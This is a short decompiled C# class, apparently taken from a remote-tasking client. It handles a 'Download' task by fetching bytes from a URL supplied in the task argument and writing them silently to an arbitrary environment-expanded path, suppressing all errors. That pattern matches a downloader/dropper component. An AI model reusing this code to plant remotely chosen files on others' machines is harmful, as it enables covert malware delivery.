using System;
using System.IO;
using System.Net;

// Token: 0x02000033 RID: 51
public class DownloadUpdate : ITaskProcessor
{
	// Token: 0x06000114 RID: 276 RVA: 0x00003B6F File Offset: 0x00001D6F
	public bool IsValidAction(UpdateAction action)
	{
		return action == UpdateAction.Download;
	}

	// Token: 0x06000115 RID: 277 RVA: 0x0000A52C File Offset: 0x0000872C
	public bool Process(UpdateTask updateTask)
	{
		try
		{
			string[] array = updateTask.TaskArg.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			File.WriteAllBytes(Environment.ExpandEnvironmentVariables(array[1]), new WebClient().DownloadData(array[0]));
		}
		catch
		{
		}
		return true;
	}
}
